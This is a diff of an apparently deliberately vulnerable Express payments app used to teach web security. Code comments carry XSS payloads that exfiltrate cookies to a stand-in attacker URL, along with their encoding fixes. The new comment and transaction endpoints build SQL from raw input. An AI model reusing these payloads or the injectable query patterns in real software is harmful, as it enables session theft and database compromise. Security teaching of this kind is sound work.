@@ -1,5 +1,21 @@
 const express = require('express')
 const port = parseInt(process.env.PORT, 10) || 3000
+const htmlencode = require('htmlencode');
+
+/* Example of stored xss
+<script>var url = `http://localhost:3001/hack?victimCookie=${document.cookie}`;document.write(`<img src="${url}"/>`);</script>
+
+solution: ${htmlencode.htmlEncode(comment)}
+*/
+
+/* Examples of reflected xss
+http://localhost:3000/search_payments?date=%3Cscript%3Evar+url+%3D+%60http%3A%2F%2Flocalhost%3A3001%2Fhack%3FvictimCookie%3D%24%7Bdocument.cookie%7D%60%3Bdocument.write%28%60%3Cimg+src%3D%22%24%7Burl%7D%22%2F%3E%60%29%3B%3C%2Fscript%3E
+
+With Same Origin Policy Block:
+<script>var url = `http://localhost:3001/hack?victimCookie=${document.cookie}`;fetch(url);</script>
+
+solution: htmlencode.htmlEncode(date)
+*/
 
 const { Client } = require('pg')
 
@@ -24,6 +40,37 @@ app.use(session({
 
 app.use(express.urlencoded());
 
+const fetchAndRenderCommentsList = async () => {
+    const client = new Client(DB_CONNECTION)
+
+    try {      
+        client.connect()
+        
+        const selectQuery = `select * from comment`;
+        const commentRecords = await client.query(selectQuery);
+                    
+        let commentItemsHtml = '';
+        commentRecords.rows.forEach(({ user_email, user_name, comment }) => {
+            commentItemsHtml += `<li style="border:1px solid; margin-bottom:5px; padding: 5px;">
+                <p><strong>Email:</strong> ${user_email}</p>
+                <p><strong>Name:</strong> ${user_name}</p>
+                <div>
+                    <p><strong>Comment:</strong></p>
+                    <p>${htmlencode.htmlEncode(comment)}</p>
+                </div>
+            </li>`;
+        });
+        
+        return `<ul style="list-style-type:none; padding: 0;">${commentItemsHtml}</ul>`;
+
+    } catch(error) {
+        console.log('Error: ', error);
+        return `<p>Error</p>`
+    } finally {
+        client.end()
+    } 
+}
+
 app.get('/', (req, res) => {
     console.log('Session ID: ', req.sessionID);
 
@@ -38,6 +85,145 @@ app.get('/', (req, res) => {
         </main>
     </html>`);
 })
+
+app.get('/comments', async (req, res) => {
+    return res.send(`<html>
+        <main>
+            <header>
+                <aside id="sidebar">
+                    <a href="/payments">Payments</a>
+                    <a href="/me">Account info</a>
+                </aside>
+            </header>
+            <article>
+                <form method="POST" action="/comments">
+                    <h1>Make your review</h1>
+                    <fieldset>
+                        <p>
+                            <label>
+                                Email
+                                <input name="email" type="email" placeholer="Write your email"/>
+                            </label>
+                        <p>                        
+                        <p>
+                            <label>
+                                Name
+                                <input name="name" type="text" placeholer="Write your name"/>
+                            </label>
+                        </p>
+                        <p>
+                            <label>
+                                <p>Your Comment</p>
+                                <textarea name="comment" rows="4" cols="50" placeholder="Leave your review"></textarea>
+                            </label>
+                        </p>
+                        <button type="submit">Send</button>
+                    </fieldset>                    
+                </form>
+                <section>
+                    <h2>Comments</h2>
+                    ${await fetchAndRenderCommentsList()}
+                </section>
+            </article>
+        </main>
+    </html>`);
+})
+
+app.post('/comments', (req, res) => {
+    const client = new Client(DB_CONNECTION)
+    const { name, email, comment } = req.body;
+    
+    client.connect()
+    
+    const insertQuery = `insert into comment (user_email, user_name, comment) values('${email}', '${name}', '${comment}')`;
+    console.log('Insert User: ', insertQuery);
+    client.query(insertQuery, (dbErr, dbRes) => {
+        if (dbErr) {
+            // TODO
+            console.log('Error: ', dbErr)
+            res.redirect('/');
+        } else {
+            res.redirect('/comments');
+        }
+        
+        client.end()
+    })
+  }
+)
+
+app.get('/transaction/new', async (req, res) => {
+    return res.send(`<html>
+        <main>
+            <header>
+                <aside id="sidebar">
+                    <a href="/payments">Payments</a>
+                    <a href="/me">Account info</a>
+                </aside>
+            </header>
+            <article>
+                <form method="POST" action="/transactions">
+                    <h1>Send funds</h1>
+                    <fieldset>
+                        <p>
+                            <label>
+                                Email destination
+                                <input name="email" type="email" placeholer="Email to receive money"/>
+                            </label>
+                        <p>                        
+                        <p>
+                            <label>
+                                Amount
+                                <input name="amount" type="number" placeholer="Write the amount"/>
+                            </label>
+                        </p>
+                        <button type="submit">Send</button>
+                    </fieldset>                    
+                </form>
+            </article>
+        </main>
+    </html>`);
+})
+
+app.post('/transactions', async (req, res) => {
+    const client = new Client(DB_CONNECTION)
+    const { email, amount } = req.body;
+    
+    try {
+        client.connect()
+
+        const currentSessionQuery = `select * from user_session where session_id = '${req.sessionID}'`;
+
+        const sessionRows = await client.query(currentSessionQuery);
+
+        // Check authentication
+        const isAuthValid = !!(sessionRows && sessionRows.rowCount === 1);
+        
+        if (!isAuthValid) {
+            res.redirect('/');
+            return;
+        }
+        
+        const authUserEmail = sessionRows.rows[0]['user_email'];
+        
+        const insertQuery = `insert into transactions (from_email, to_email, amount) values('${authUserEmail}', '${email}', '${amount}')`;
+        console.log('Insert Transaction: ', insertQuery);
+        await client.query(insertQuery, (dbErr, dbRes) => {
+            if (dbErr) {
+                console.log('Error: ', dbErr)
+                res.redirect('/');
+            } else {
+                res.redirect('/transaction/new');
+            }
+
+            client.end()
+        })
+
+    } catch(error) {
+        client.end()
+        res.redirect('/');        
+    }
+  }
+)
 
 app.get('/signup', (req, res) => {
     console.log('Session ID: ', req.sessionID);
@@ -81,6 +267,7 @@ app.get('/me', async (req, res) => {
                 <aside id="sidebar">
                     <a href="/payments">Payments</a>
                     <a href="/users/${authUserEmail}">Account info</a>
+                    <a href="/transaction/new">Send money</a>                    
                 </aside>
                 <p>Welcome Home</p>
                 <form method="POST" action="/logout">
@@ -109,8 +296,8 @@ app.post('/sessions', async (req, res) => {
 
         // TODO protection to destroy previous session. Leave it open as a vulnerability
 
-        // const destroySessionQuery = `DELETE from user_session where user_email='${email}'`;
-        // await client.query(destroySessionQuery);
+        const destroySessionQuery = `DELETE from user_session where user_email='${email}'`;
+        await client.query(destroySessionQuery);
 
         // console.log('Destroy session query: ', destroySessionQuery);
 
@@ -232,7 +419,7 @@ app.get('/payments', (req, res) => {
     return res.send(`<html>
         <main>
             <form method="GET" action="/search_payments">
-                <input name="date" type="text"/>
+                <input name="date" type="text" style="width: 80%"/>
                 <button type="submit">Search</button>
             </form>
             <a href="/me">Home</a>
@@ -287,7 +474,7 @@ app.get('/search_payments', async (req, res) => {
         </html>`
         
         // TODO to remove, letting an open vulnerability for reflected XSS
-        res.set('X-XSS-Protection', 0);
+        // res.set('X-XSS-Protection', 0);
 
         res.send(htmlResponse)
 
